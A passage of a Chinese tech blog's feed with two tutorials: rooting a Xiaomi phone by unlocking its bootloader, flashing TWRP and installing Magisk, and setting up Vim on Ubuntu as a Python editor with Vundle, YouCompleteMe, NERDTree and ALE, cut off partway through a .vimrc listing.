即为解锁文件</li></ul><p>其他暂不用关心，将你的电脑与手机用数据线连接起来；</p><p>打开顺序，先把驱动安装完，然后打开解锁文件<code>miflash_unlock.exe</code>。</p><p>如图，首先打开工具登录查询：</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fytsfun2t8j30fa08vaaf.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fytsg5oqq0j30fa0ahmx8.jpg" alt=""></p></blockquote><p>其次，进入<em>Fastboot</em>模式，开始解锁</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fytsgly5rsj30fa0aiweo.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fytsh34r48j30fa0ahq35.jpg" alt=""></p></blockquote><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p style="text-align: center;"> <img src="http://ww1.sinaimg.cn/mw690/006V665tgy1fytsjnf0aaj30u01hcadf.jpg" width="50%" height="40%"> </p><p>关于<em>Android</em>机，能把<em>Bootloader</em>锁了的，基本上都可以拿到<em>root</em>管理权。所以这一步成功了，后面的基本都不用担心了，问题都不大。</p><h2 id="刷入TWRP"><a href="#刷入TWRP" class="headerlink" title="刷入TWRP"></a>刷入TWRP</h2><blockquote><p>关于<em>TWRY</em>，它是一个替换系统自带<em>Recovery</em>模式的工具，由于系统自带的<em>Recovery</em>模式功能太简陋（一切为了安全）。</p><p>这里暂且不较真将它简单地认为为电脑的 <em>BIOS</em> 。</p></blockquote><p>官网：<a href="https://twrp.me" target="_blank" rel="noopener">https://twrp.me</a></p><p>下载（此链接仅适用于<em>capricorn</em>）：<a href="https://dl.twrp.me/capricorn/" target="_blank" rel="noopener">https://dl.twrp.me/capricorn/</a></p><p>先将其最新版本下载到本地计算机，它的名称就像<code>twrp-x.x.x-x-capricorn.img</code>。建议将其放入之前那个小米解锁工具的文件夹中。</p><h4 id="进入-FASTBOOT"><a href="#进入-FASTBOOT" class="headerlink" title="进入 FASTBOOT"></a>进入 FASTBOOT</h4><p>然后，打开你的Windows中的CMD，切换当前路径为那个解锁工具的目录，然后使用以下命令将其重启到<strong><em>FASTBOOT</em></strong>模式。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure><blockquote><p>如果不懂上面这种方法，你还可以通过组合键到 <strong><em>FASTBOOT</em></strong> 模式；</p><p>重启设备，在进入开机的开始，按住<code>Volume Down</code>+<code>Power</code>，直至屏幕上出现 <strong><em>FASTBOOT</em></strong>。</p></blockquote><p>成功进入后，你还可以通过以下命令验证电脑是否找到手机</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot devices</span><br></pre></td></tr></table></figure><h4 id="刷入-TWRY"><a href="#刷入-TWRY" class="headerlink" title="刷入 TWRY"></a>刷入 TWRY</h4><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash recovery twrp-x.x.x-x-capricorn.img</span><br></pre></td></tr></table></figure><p>注意命名</p><h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p>同时按住 <code>音量上键</code> ＋ <code>电源键</code> ，没有进入 <em>TWRY</em> 的 <em>Recovery</em> 模式界面绝不要松手，直到进入 <em>TWRY</em> 的 <em>recovery</em> 界面为止。如下图，即为成功：</p><p style="text-align: center;"> <img src="http://ww1.sinaimg.cn/mw690/006V665tgy1fytshrz14rj31ys2y9hcy.jpg" width="50%" height="50%"> </p><h2 id="安装Magisk"><a href="#安装Magisk" class="headerlink" title="安装Magisk"></a>安装Magisk</h2><blockquote><p>关于Magisk，其强大的功能，使得我们普通玩家足以与厂商进行博弈。还是开源的，很给力。</p></blockquote><p>Magisk仓库：<a href="https://github.com/topjohnwu/Magisk" target="_blank" rel="noopener">https://github.com/topjohnwu/Magisk</a></p><h5 id="其功能："><a href="#其功能：" class="headerlink" title="其功能："></a>其功能：</h5><ul><li>集成 root（MagiskSU）</li><li>SafetyNet</li><li>root 和 Magisk 的日志功能</li><li>Magisk Hide（隐藏 Magisk 的 root 权限）</li><li>systemless hosts（广告屏蔽）</li><li>Magisk 模块（例如，Xposed）</li></ul><p>Magisk工具包下载：<a href="https://pan.baidu.com/s/1ixJnljXY1mIgUWjk5FkYBQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1ixJnljXY1mIgUWjk5FkYBQ</a> 提取码: d8fy</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>下载上面的工具包，将其中的<code>Magisk-v18.0.zip</code>复制到手机的 <em>/sdcard</em> 目录下，然后重启到Recovery模式下，安装这个<code>zip</code>包，找到这个包，然后滑动滑块，开始刷入……</p><p style="text-align: center;"> <img src="http://ww1.sinaimg.cn/mw690/006V665tgy1fytskujgeyj30u01hcjrs.jpg" width="50%" height="40%"> </p><p style="text-align: center;"> <img src="http://ww1.sinaimg.cn/mw690/006V665tgy1fytsl3fdlsj30u01hc0tk.jpg" width="50%" height="40%"> </p><p style="text-align: center;"> <img src="http://ww1.sinaimg.cn/mw690/006V665tgy1fytsl907vjj30u01hcdgw.jpg" width="50%" height="40%"> </p> <p>完成后重启，在桌面上可以找到<code>Magisk Manager</code>，这个是<code>Magisk</code>的管理工具。</p><p style="text-align: center;"> <img src="http://ww1.sinaimg.cn/mw690/006V665tgy1fytslit8z1j30u01hcwpe.jpg" width="50%" height="40%"> </p><p style="text-align: center;"> <img src="http://ww1.sinaimg.cn/mw690/006V665tgy1fytslr8iehj30u01hc74z.jpg" width="50%" height="40%"> </p><p>至此，你就拿到了设备的root管理权</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;首先，&lt;strong&gt;安全第一&lt;/strong&gt;，请不要将日常生活使用的手机拿来这样搞；尤其是用来做支付的手机。&lt;/p&gt;
&lt;p&gt;其次，高可玩性得益于 Android 的开源。此文章仅算入坑，适合爱折腾的小白朋友；Android 机拿到最高权限的思路都类似，同是安卓机，即可借鉴。&lt;/p&gt;
&lt;p&gt;高可玩性，是有了 &lt;em&gt;root&lt;/em&gt; 管理权后的自由，所以便有了此文。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="TechShare" scheme="https://fanqxu.com/categories/TechShare/"/>
    
    
      <category term="root" scheme="https://fanqxu.com/tags/root/"/>
    
  </entry>
  
  <entry>
    <title>Vim 搭建 Python 开发环境入坑</title>
    <link href="https://fanqxu.com/2018/12/13/linux-vim-python/index.html"/>
    <id>https://fanqxu.com/2018/12/13/linux-vim-python/index.html</id>
    <published>2018-12-13T10:34:48.000Z</published>
    <updated>2019-04-03T10:21:33.007Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原本用着 Pycharm 好好的，可是它有点占用资源；每次在打开的过程中，CPU 直彪向 100% ，打开后稳定下来才恢复正常；也不知道这种情况是否属正常现象，网上的解决方案都无果。</p><p>由此便有了此文……</p></blockquote><a id="more"></a><h3 id="0x00-先说一下我的环境"><a href="#0x00-先说一下我的环境" class="headerlink" title="0x00 先说一下我的环境"></a>0x00 先说一下我的环境</h3><ul><li><p>OS : Ubuntu18.04</p></li><li><p>Python 3.6.7</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install python3</span><br></pre></td></tr></table></figure></li><li><p>pip 18.1</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install python3-pip</span><br></pre></td></tr></table></figure></li><li><p><a href="https://github.com/vim/vim" target="_blank" rel="noopener">Vim</a> 8.0 +</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install vim</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x01-版本检查"><a href="#0x01-版本检查" class="headerlink" title="0x01 版本检查"></a>0x01 版本检查</h3><p>如果你的操作系统已经安装了 <em>vim</em> ，你需要先检查一下它的版本；尽可能的将你的 <em>vim</em> 升级到新版本（<em>vim 8.0+</em>），否则可能会影响后续操作，出现版本不兼容之类的问题。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim --version</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fy50msk0xlj30y40qwe81.jpg" alt=""></p><p>　　如上图所示，就算正常了。</p><h3 id="0x02-Vim-安装"><a href="#0x02-Vim-安装" class="headerlink" title="0x02 Vim 安装"></a>0x02 Vim 安装</h3><p>若安装的版本不对，那么先卸载它，然后重新安装</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt purge vim</span><br></pre></td></tr></table></figure><blockquote><p>注：使用 <em>purge</em> 可将其配置文件一并移除掉，比 <em>remove</em> 移除的更加干净。</p></blockquote><p>如果没有安装 <em>vim</em> ，那就这个样子</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install vim</span><br></pre></td></tr></table></figure><h3 id="0x03-插件管理器"><a href="#0x03-插件管理器" class="headerlink" title="0x03 插件管理器"></a>0x03 插件管理器</h3><blockquote><p>即 <strong>Vundle</strong> ，是 <em>Vim bundle</em> 的缩写，一个广泛使用的插件管理器。</p></blockquote><p><strong>Github 仓库</strong>：<a href="https://github.com/VundleVim/Vundle.vim" target="_blank" rel="noopener">https://github.com/VundleVim/Vundle.vim</a></p><p><img src="https://camo.githubusercontent.com/bc559468e6623d18947ced1ef353f68f6116e45a/687474703a2f2f692e696d6775722e636f6d2f527565683743632e706e67" alt="img"></p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><h5 id="先安装一个分布式版本控制系统"><a href="#先安装一个分布式版本控制系统" class="headerlink" title="先安装一个分布式版本控制系统"></a>先安装一个分布式版本控制系统</h5><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install git</span><br></pre></td></tr></table></figure><h5 id="然后将其克隆到本地"><a href="#然后将其克隆到本地" class="headerlink" title="然后将其克隆到本地"></a>然后将其克隆到本地</h5><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="hljs-built_in">clone</span> https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</span><br></pre></td></tr></table></figure><p>请注意大小写，这条命令就是将 <strong>Vundle</strong> 克隆到本地的 <em>~/.vim/bundle/</em> 目录下</p><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>回到你的家目录，创建 <em>vim</em> 的配置文件 <em>.vimrc</em> ，然后编辑它</p><p>　　　　$ cd ~ &amp;&amp; touch .vimrc &amp;&amp; gedit .vimrc</p><p> 再然后，将下面这一段复制到配置文件 <em>.vimrc</em> 中，其中的 <em>“</em> 相当于一般的配置文件中的 <em>#</em> ，在一段中，<em>“</em> 后面的语句都算注释语句，不生效；第十一行空着的目的就是，如果以后你想再添加其他的插件，那么其语句都应在空着的这行之中。 </p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">set</span> nocompatible              <span class="hljs-string">" 必须，加载vim自带和插件相应的语法和文件类型相关脚本</span></span><br><span class="line"><span class="hljs-string">filetype off                  "</span> 必须要添加</span><br><span class="line"><span class="hljs-built_in">set</span> rtp+=~/.vim/bundle/Vundle.vim <span class="hljs-string">" 设置包括vundle和初始化相关的runtime path</span></span><br><span class="line"><span class="hljs-string">call vundle#begin()</span></span><br><span class="line"><span class="hljs-string">"</span> 另一种选择, 指定一个vundle安装插件的路径</span><br><span class="line"><span class="hljs-string">"call vundle#begin('~/some/path/here')</span></span><br><span class="line"><span class="hljs-string">"</span> 让vundle管理插件版本,必须</span><br><span class="line">Plugin <span class="hljs-string">'gmarik/Vundle.vim'</span></span><br><span class="line"><span class="hljs-string">" 添加你的所有插件在这儿 (注意Vundle的旧版本使用Bundle而不是Plugin)</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"</span> 你的所有插件需要在下面这行之前</span><br><span class="line">call vundle<span class="hljs-comment">#end()            " 必须</span></span><br><span class="line">filetype plugin indent on    <span class="hljs-string">" 必须，加载vim自带和插件相应的语法和文件类型相关脚本</span></span><br></pre></td></tr></table></figure><h5 id="开始安装了"><a href="#开始安装了" class="headerlink" title="开始安装了"></a>开始安装了</h5><p>安装这里有点绕，其实就是在终端打开 <em>vim</em> ，在命令模式（也就是直接进去的状态）下输入下面这条命令回车，这里得提供一下动态图，看图。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:PluginInstall</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fy52makn42g30sl0lggob.gif" alt=""></p><p>　　稍等，完成安装后右下角会出现 <strong>Done!</strong> 届时，再退出去。</p><h5 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h5><p>除了安装插件的命令，还有一些其他的命令。</p><blockquote><p>:PluginList                - 列出所有已配置的插件</p><p>:PluginInstall           - 安装插件,追加 <code>!</code> 用以更新</p><p>:PluginUpdate         - 更新插件</p><p> :PluginSearch foo  - 搜索 foo ; 追加 <code>!</code> 清除本地缓存</p><p>:PluginClean            - 清除未使用插件,需要确认; 追加 <code>!</code> 自动批准移除未使用插件</p></blockquote><h3 id="0x04-代码补全"><a href="#0x04-代码补全" class="headerlink" title="0x04 代码补全"></a>0x04 代码补全</h3><blockquote><p>强大的代码补全插件，即 <strong>YouCompleteMe</strong> 。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fy54p611ppg30q90d0x6r.gif" alt=""></p><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><p>在安装 <em>YouCompleteMe</em> 前，需安装相关依赖</p><ul><li><p>Ubuntu 16.04及更高版本</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install build-essential cmake python3-dev</span><br></pre></td></tr></table></figure></li></ul><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>将下面一行写入到配置文件 <em>.vimrc</em> 的相应位置（上面有说过），然后打开 <em>vim</em> 输入 <em>:PluginInstall</em> 回车进行安装。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plugin <span class="hljs-string">'Valloric/YouCompleteMe'</span></span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fy52makn42g30sl0lggob.gif" alt=""></p><p>等着……</p><h4 id="配置相应语言支持"><a href="#配置相应语言支持" class="headerlink" title="配置相应语言支持"></a>配置相应语言支持</h4><h5 id="如需-C-语言家族支持-可选"><a href="#如需-C-语言家族支持-可选" class="headerlink" title="如需 Ｃ 语言家族支持(可选)"></a>如需 Ｃ 语言家族支持(可选)</h5><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./install.py --clang-completer</span><br></pre></td></tr></table></figure><h5 id="如需-Java-可选"><a href="#如需-Java-可选" class="headerlink" title="如需 Java(可选)"></a>如需 Java(可选)</h5><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./install.py --java-completer</span><br></pre></td></tr></table></figure><h5 id="如需所有语言"><a href="#如需所有语言" class="headerlink" title="如需所有语言"></a>如需所有语言</h5><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./install.py --all</span><br></pre></td></tr></table></figure><h5 id="对于-Python３-还需配置"><a href="#对于-Python３-还需配置" class="headerlink" title="对于 Python３ 还需配置"></a>对于 <em>Python３</em> 还需配置</h5><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 install.py -all</span><br></pre></td></tr></table></figure><p>至此完毕，另外关于 <em>YouCompleteMe</em> 配置文件，我会在最后说……</p><h3 id="0x05-文件树"><a href="#0x05-文件树" class="headerlink" title="0x05 文件树"></a>0x05 文件树</h3><blockquote><p><strong>NERDTree</strong> 是 <em>Vim</em> 编辑器的文件系统资源管理器。使用此插件，用户可以直观地浏览复杂的目录层次结构，快速打开文件以进行读取或编辑，以及执行基本的文件系统操作。</p></blockquote><p><strong>Github 仓库</strong>：<a href="https://github.com/scrooloose/nerdtree" target="_blank" rel="noopener">https://github.com/scrooloose/nerdtree</a></p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fy55njeys4g312t0qnb29.gif" alt=""></p><h4 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h4><p>还是和上面安装 <em>YouCompleteMe</em> 插件一样，将下面一行添加到配置文件 <em>.vimrc</em> 中的 <em>Plugin ‘Valloric/YouCompleteMe’</em> 的下一行，然后打开 <em>vim</em> 输入 <em>:PluginInstall</em> 回车进行安装。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plugin <span class="hljs-string">'scrooloose/nerdtree'</span></span><br></pre></td></tr></table></figure><p>关于它的配置，最后再说……</p><h3 id="0x06-代码诊断"><a href="#0x06-代码诊断" class="headerlink" title="0x06 代码诊断"></a>0x06 代码诊断</h3><blockquote><p>ALE（异步Lint引擎）是一个插件，用于在编辑文本文件时在NeoVim 0.2.0+和Vim 8中提供linting，并充当Vim <a href="https://langserver.org/" target="_blank" rel="noopener">语言服务器协议</a>客户端。</p></blockquote><p><strong>Github 仓库</strong>：<a href="https://github.com/w0rp/ale" target="_blank" rel="noopener">https://github.com/w0rp/ale</a></p><p>ALE充当“语言客户端”以支持各种语言服务器协议功能，包括：</p><ul><li>诊断（通过语言服务器协议连接）</li><li>转到定义（<code>:ALEGoToDefinition</code>）</li><li>完成（<code>let g:ale_completion_enabled = 1</code>加载ALE之前）</li><li>寻找参考（<code>:ALEFindReferences</code>）</li><li>悬停信息（<code>:ALEHover</code>）</li><li>符号搜索（<code>:ALESymbolSearch</code>）</li></ul><p><img src="https://raw.githubusercontent.com/w0rp/ale/master/img/example.gif" alt=""></p><h4 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h4><p>在这里我使用 <em>git</em> ，将其克隆到本地 <code>~/.vim/bundle/</code> 下。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="hljs-built_in">cd</span>  ~ / .vim/bundle &amp;&amp; git <span class="hljs-built_in">clone</span> https://github.com/w0rp/ale.git</span><br></pre></td></tr></table></figure><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p><strong>pylint</strong> 这是一个 <em>Python</em> 静态代码分析工具，它将配合 <strong>ALE</strong> 一起使用，可以查找编程错误，帮助强制执行编码标准，嗅探代码异味并提供简单的重构建议。</p><ul><li><p><strong>Github 仓库</strong>：<a href="https://github.com/PyCQA/pylint" target="_blank" rel="noopener">https://github.com/PyCQA/pylint</a></p></li><li><p><strong>官网</strong>：<a href="http://pylint.pycqa.org/en/latest/" target="_blank" rel="noopener">http://pylint.pycqa.org/en/latest/</a></p></li><li><p><strong>pip安装</strong></p><ul><li>由于 <em>pip</em> 安装东西权限不好解决，故应先切换到 <em>root</em> 用户再进行安装</li></ul><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -i </span><br><span class="line">……</span><br><span class="line"><span class="hljs-comment"># pip install pylint --upgrade</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="0x07-关于-Vim-的配置"><a href="#0x07-关于-Vim-的配置" class="headerlink" title="0x07 关于 Vim 的配置"></a>0x07 关于 Vim 的配置</h3><blockquote><p>在上面安装了几个插件，我们就可以按照自己的需求来配置实现相应功能。即对 <code>.vimrc</code> ，此文件进行配置。</p></blockquote><h4 id="我的-vimrc"><a href="#我的-vimrc" class="headerlink" title="我的 .vimrc"></a>我的 <code>.vimrc</code></h4><p>其实，我的这份配置文件也是在网上找的，做了个整合，还对一些语句做了注释（不然都看不懂）。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">"vundle配置</span></span><br><span class="line"><span class="hljs-string">"</span> <span class="hljs-built_in">set</span> the runtime path to include Vundle and initialize</span><br><span class="line"><span class="hljs-built_in">set</span> rtp+=~/.vim/bundle/Vundle.vim      <span class="hljs-string">" 设置包括vundle和初始化相关的runtime path</span></span><br><span class="line"><span class="hljs-string">call vundle#begin()</span></span><br><span class="line"><span class="hljs-string">"</span>call vundle<span class="hljs-comment">#begin('~/some/path/here') " 另一种选择, 指定一个vundle安装插件的路径</span></span><br><span class="line"><span class="hljs-string">" 让vundle管理插件版本,必须</span></span><br><span class="line"><span class="hljs-string">Plugin 'gmarik/Vundle.vim'</span></span><br><span class="line"><span class="hljs-string">Plugin 'Valloric/YouCompleteMe'</span></span><br><span class="line"><span class="hljs-string">let g:ycm_key_invoke_completion = '&lt;c-z&gt;' "</span> 提示快捷键</span><br><span class="line">Plugin <span class="hljs-string">'scrooloose/nerdtree'</span></span><br><span class="line"><span class="hljs-string">" 添加你的所有插件在这儿 (注意Vundle的旧版本使用Bundle而不是Plugin)</span></span><br><span class="line"><span class="hljs-string">Plugin 'jistr/vim-nerdtree-tabs'</span></span><br><span class="line"><span class="hljs-string">autocmd VimEnter * NERDTree</span></span><br><span class="line"><span class="hljs-string">Bundle 'davidhalter/jedi-vim'</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">let g:SimpyIFold_docstring_preview=1 "</span> 完成补全后自动消失预览窗口</span><br><span class="line"><span class="hljs-built_in">let</span> g:ycm_server_python_interpreter=<span class="hljs-string">'/usr/bin/python3'</span> <span class="hljs-string">" 蟒蛇解释器位置</span></span><br><span class="line"><span class="hljs-string">let g:ycm_global_ycm_extra_conf='~/.vim/.ycm_extra_conf.py'</span></span><br><span class="line"><span class="hljs-string">let g:ycm_autoclose_preview_window_after_completion=1 "</span> 完成操作后自动补全窗口不消失</span><br><span class="line"><span class="hljs-built_in">set</span> completeopt=preview <span class="hljs-string">" 补全内容不以分割子窗口形式出现，只显示补全列表</span></span><br><span class="line"><span class="hljs-string">let NERDTreeIgnore=['\.pyc$', '\~$'] "</span>ignore files <span class="hljs-keyword">in</span> NERDTree</span><br><span class="line"></span><br><span class="line"><span class="hljs-string">"显示相关</span></span><br><span class="line"><span class="hljs-string">"</span><span class="hljs-built_in">set</span> shortmess=atI  <span class="hljs-string">"不显示帮助乌干达的提示</span></span><br><span class="line"><span class="hljs-string">colorscheme desert "</span>设置配色方案</span><br><span class="line"><span class="hljs-built_in">set</span> showcmd <span class="hljs-string">"输入的命令显示出来</span></span><br><span class="line"><span class="hljs-string">syntax on "</span>语法高亮</span><br><span class="line"><span class="hljs-built_in">set</span> tabstop=4  <span class="hljs-string">"Tab键的宽度设为４</span></span><br><span class="line"><span class="hljs-string">set softtabstop=4</span></span><br><span class="line"><span class="hljs-string">set shiftwidth=4  "</span>统一缩进为４</span><br><span class="line"><span class="hljs-built_in">set</span> autoindent  <span class="hljs-string">"开启自动缩进，保持缩进值与上一行相等</span></span><br><span class="line"><span class="hljs-string">autocmd InsertLeave * se nocul "</span>用浅色高亮当前行</span><br><span class="line">autocmd InsertEnter * se cul <span class="hljs-string">"用浅色高亮当前行</span></span><br><span class="line"><span class="hljs-string">set ruler "</span>显示当前光标行列位置</span><br><span class="line"><span class="hljs-built_in">set</span> mouse=a <span class="hljs-string">"支持鼠标</span></span><br><span class="line"><span class="hljs-string">set laststatus=2 "</span>显示状态栏（默认值为１，无法显示状态栏)</span><br><span class="line"><span class="hljs-keyword">if</span> has(<span class="hljs-string">'gui_running'</span>)</span><br><span class="line">    <span class="hljs-built_in">set</span> t_Co=256</span><br><span class="line">endif</span><br><span class="line"><span class="hljs-built_in">set</span> guifont=Mono</span><br><span class="line"><span class="hljs-built_in">set</span> autoread <span class="hljs-string">"当文件在外部修改时，vim自动更新载入</span></span><br><span class="line"><span class="hljs-string">set ignorecase "</span>搜索时忽略大小写</span><br><span class="line"><span class="hljs-built_in">set</span> foldmethod=syntax</span><br><span class="line"><span class="hljs-built_in">set</span> nofoldenable <span class="hljs-string">"此两行为折叠代码</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"</span>自定义键映射</span><br><span class="line"><span class="hljs-string">"实现CTRL-w保存操作</span></span><br><span class="line"><span class="hljs-string">nnoremap &lt;C-w&gt; :w&lt;cr&gt;</span></span><br><span class="line"><span class="hljs-string">imap &lt;C-w&gt; &lt;Esc&gt;:w&lt;cr&gt;</span></span><br><span class="line"><span class="hljs-string">"</span>映射以F12打开NERDTree</span><br><span class="line">nnoremap &lt;silent&gt; &lt;F12&gt; :NERDTree&lt;CR&gt;</span><br><span class="line"><span class="hljs-string">"映射自动补全括号</span></span><br><span class="line"><span class="hljs-string">inoremap ( ()&lt;ESC&gt;i</span></span><br><span class="line"><span class="hljs-string">inoremap [ []&lt;ESC&gt;i</span></span><br><span class="line"><span class="hljs-string">inoremap &#123; &#123;&#125;&lt;ESC&gt;i</span></span><br><span class="line"><span class="hljs-string">inoremap "</span> <span class="hljs-string">""</span>&lt;ESC&gt;i</span><br><span class="line">inoremap <span class="hljs-string">' '</span><span class="hljs-string">'&lt;ESC&gt;i</span></span><br><span class="line"><span class="hljs-string">set encoding=utf-8</span></span><br><span class="line"><span class="hljs-string">set fenc=utf-8</span></span><br><span class="line"><span class="hljs-string">set 